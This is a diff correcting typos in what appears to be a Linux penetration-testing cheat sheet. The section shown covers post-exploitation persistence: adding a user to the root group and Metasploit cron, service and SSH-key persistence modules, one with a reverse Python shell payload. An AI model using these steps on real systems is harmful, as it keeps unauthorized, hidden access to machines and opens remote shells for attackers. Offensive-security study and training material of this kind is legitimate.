@@ -3073,7 +3073,7 @@ passwd <user-name> (set the password of that user)
 > This will only run the target use ssh and remote access protocol
 
 ```shell
-gorups root
+groups root
 ```
 > this is use to check the username that is the part of root or not
 
@@ -3085,14 +3085,14 @@ usermod -aG root <user-name>
 ***Another Way***
 
 ```shell
-search platform:linux presistence
-use exploit/Linux/local/cron_presistence
+search platform:linux persistence
+use exploit/linux/local/cron_persistence
 set session
 run
 ```
 
 ```shell
-use exploit/Linux/local/srvice_presistence
+use exploit/linux/local/service_persistence
 set session
 set payload cmd/unix/reverse_python
 set target 4
@@ -3100,7 +3100,7 @@ run
 ```
 
 ```shell
-use exploit/Linux/manage/sshkey_presistence
+use post/linux/manage/sshkey_persistence
 set createsshfolder true
 set session
 run
